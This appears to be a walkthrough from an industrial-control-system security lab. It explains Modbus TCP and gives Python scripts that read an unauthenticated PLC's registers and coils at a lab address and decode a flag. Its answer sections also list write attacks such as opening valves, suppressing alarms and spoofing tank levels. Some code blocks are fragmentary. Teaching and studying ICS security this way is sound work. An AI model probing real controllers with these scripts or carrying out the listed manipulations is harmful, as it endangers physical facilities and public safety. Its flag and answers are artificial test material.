    Background: The Modbus Protocol

    History

    Modbus was created in 1979 by Modicon (now Schneider Electric) for communication between programmable logic controllers. It was one of the first open industrial protocols and remains the most widely deployed ICS protocol in the world: found in power plants, water treatment facilities, oil refineries, and manufacturing lines.

    The original Modbus ran over serial lines (RS-232/RS-485). In the late 1990s, Modbus TCP wrapped the same protocol in TCP/IP packets, making it routable over Ethernet networks. The protocol itself was not changed: no authentication, no encryption, no integrity checking was added.

    Why Modbus Has No Security

    Modbus was designed for an era when:

    • Controllers were connected by dedicated serial cables in locked control rooms
    • Physical security was the only access control needed
    • Networks were air-gapped from business systems and the internet
    • The concept of a cyber attack on industrial systems did not exist

    Today, Modbus TCP runs on IP networks that are often reachable from corporate LANs, VPNs, and sometimes the public internet. The protocol has not changed. Anyone who can establish a TCP connection to port 502 can read, and write, process data.

    Register Types

    Modbus organizes data into four types:

    Type Access Size Address Range Description
    Holding Registers Read/Write 16-bit 40001-49999 Primary process data: setpoints, control values, configuration
    Input Registers Read-Only 16-bit 30001-39999 Measured values from sensors: temperatures, pressures, levels
    Coils Read/Write 1-bit 00001-09999 Boolean outputs: valve open/close, pump on/off, relay states
    Discrete Inputs Read-Only 1-bit 10001-19999 Boolean inputs: limit switches, safety interlocks, alarm states

    Function Codes

    Each Modbus operation uses a function code to specify what action to perform:

    Function Code Name Action
    FC01 Read Coils Read boolean output states
    FC02 Read Discrete Inputs Read boolean input states
    FC03 Read Holding Registers Read 16-bit read/write registers
    FC04 Read Input Registers Read 16-bit read-only registers
    FC05 Write Single Coil Set a single boolean output
    FC06 Write Single Register Set a single 16-bit register
    FC16 Write Multiple Registers Set multiple 16-bit registers at once

    In this exercise, you will use FC03 (Read Holding Registers), FC01 (Read Coils), and FC04 (Read Input Registers).

    Data Representation

    Modbus registers are 16-bit unsigned integers (0-65535). Real-world process values are mapped to this range using scaling factors. For example:

    • A tank level of 42,500 barrels in a 50,000 bbl tank might be stored as 42500 in a register
    • A temperature of 68.2 degrees might be stored as 682 (multiply by 10 to avoid decimals)
    • A percentage like 85.0% might be stored as 8500 (multiply by 100)

    The PLC programmer decides the scaling. Without documentation (or reverse engineering), you must interpret what the raw register values mean.

    Step 2: Read Tank Level Registers

    Create a Python script to read the holding registers. The script connects to the PLC and reads registers 0-43:

from pymodbus.client import ModbusTcpClient

client = ModbusTcpClient('10.100.5.10', port=502)
client.connect()

# Read holding registers 0-43 (FC03)
result = client.read_holding_registers(address=0, count=44, slave=1)

if result.isError():
    print(f"Error: {result}")
else:
    registers = result.registers
    print("=" * 60)
    print("HOLDING REGISTERS (FC03) -- Hex Point Bay Terminal PLC")

    Let's calculate how full each tank is:

    Tank Product Current Level Capacity Fill %

    Knowing tank levels tells an attacker:

    • Which tanks are nearly full: overfilling a tank causes environmental spills and regulatory violations
    • Which tanks are actively being filled: disrupting a fill operation can cause product loss
    • Operational patterns: monitoring levels over time reveals delivery schedules and customer demand

    Step 4: Read Coil States (Valve Status)

result = client.read_coils(address=0, count=8, slave=1)

        "AST-01 Inlet Valve",
        "AST-01 Outlet Valve",
        "AST-02 Inlet Valve",

        "AST-03 Inlet Valve",

    print("=" * 50)

    Step 6: Decode the Flag from Registers 40-43

    Registers 40-43 contain the flag encoded as ASCII characters packed into 16-bit registers. Each register holds two ASCII characters (high byte and low byte).

    python3 << 'PYEOF'
from pymodbus.client import ModbusTcpClient

client = ModbusTcpClient('10.100.5.10', port=502)
client.connect()

# Read flag registers 40-43
result = client.read_holding_registers(address=40, count=4, slave=1)

if result.isError():
    print(f"Error: {result}")
else:
    regs = result.registers
    print("Raw register values:")
    for i, r in enumerate(regs):
        high_byte = (r >> 8) & 0xFF
        low_byte = r & 0xFF
        print(f"  Register {40+i}: {r} → 0x{r:04X} → "
              f"'{chr(high_byte)}{chr(low_byte)}'")

    # Decode all registers to string
    flag_chars = ""
    for r in regs:
        flag_chars += chr((r >> 8) & 0xFF)
        flag_chars += chr(r & 0xFF)

    print(f"\nDecoded string: {flag_chars}")
    print(f"Complete flag:  OCR{{{flag_chars}}}")

client.close()
PYEOF
    Expected Output 
    Raw register values:
  Register 40: 20291 → 0x4F43 → 'OC'
  Register 41: 21299 → 0x5333 → 'S3'
  Register 42: 28018 → 0x6D72 → 'mr'
  Register 43: 25904 → 0x6530 → 'e0'

    How the encoding works

    Each 16-bit Modbus register stores two ASCII characters:

    • High byte (bits 15-8): First character
    • Low byte (bits 7-0): Second character

    For register 40 with value 20291 (hex 0x4F43):

    • High byte: 0x4F = 79 = ASCII O
    • Low byte: 0x43 = 67 = ASCII C

    Reading all four registers gives you the encoded portion of the flag.

    Submit the decoded flag from registers 40-43 in the platform.

    Analysis Questions

    1. Modbus has no authentication. Why hasn't the protocol been updated to add it?

    Reveal Answer

    There are several reasons:

    • Backwards compatibility: Millions of deployed devices run Modbus. Adding authentication would break compatibility with every existing PLC, RTU, and HMI.
    • Resource constraints: Many Modbus devices have 8-bit or 16-bit processors with kilobytes of memory. They cannot run TLS or modern cryptographic functions.
    • Operational priority: ICS operators prioritize availability over security. Any protocol change that could cause communication failures is resisted.
    • Cost: Replacing industrial equipment costs millions and requires plant shutdowns.

    The industry response has been to add security around Modbus (firewalls, network segmentation, monitoring) rather than changing the protocol itself.

    2. You read that Diesel (AST-02) is being filled at 150 bbl/hr with the inlet valve open. What could an attacker do with write access to these registers?

    Reveal Answer

    With Modbus write access (FC05 for coils, FC06/FC16 for registers), an attacker could:

    • Open all valves simultaneously: causing uncontrolled product flow and potential spills
    • Close the inlet valve during a fill operation: causing pipeline overpressure upstream
    • Manipulate level readings: making operators think a tank is empty when it's full (or vice versa), leading to overfills or runouts
    • Suppress alarms: writing 0 to alarm input registers so operators don't see dangerous conditions
    • Trigger the emergency shutdown: halting all operations and causing financial loss

    This is exactly what happened in real-world ICS attacks like the 2015 Ukraine power grid attack and the 2017 Triton/TRISIS malware targeting safety systems.

    3. The register values use different scaling factors (1:1, x10, x100). Why is this a challenge for attackers, and defenders?

    Reveal Answer

    Without the register map documentation, raw register values are meaningless. A value of 682 could be 682 barrels, 68.2 degrees, 6.82 PSI, or something else entirely. Attackers must reverse-engineer the scaling to understand what they're looking at and craft meaningful write operations. Defenders face the same challenge when building intrusion detection systems: monitoring for "abnormal" register values requires understanding what normal looks like for each specific register. The documentation server exposure in ICS-1.1 is so dangerous precisely because it likely contains the register maps that make all other attacks possible.

    Key Takeaways

    What You Learned

    1. Modbus TCP provides complete read access with no credentials. You read every register on the PLC, tank levels, temperatures, pressures, valve states, and alarm conditions, without authenticating.

    2. Register data reveals the physical state of the facility. Knowing that AST-02 is at 81.6% capacity and actively being filled gives an attacker precise operational intelligence.

    3. Data encoding in registers follows conventions, not standards. Scaling factors, byte ordering, and data packing vary between vendors and configurations. The register map is the decoder ring.

    4. Coils and input registers complete the picture. Beyond tank levels, you now know which valves are open, which pumps are running, and whether any alarms are active.

    5. Read access enables write attacks. Everything you read with FC03/FC01/FC04 can potentially be written with FC06/FC05/FC16. Understanding the register layout is the prerequisite for manipulation attacks in Level 2.
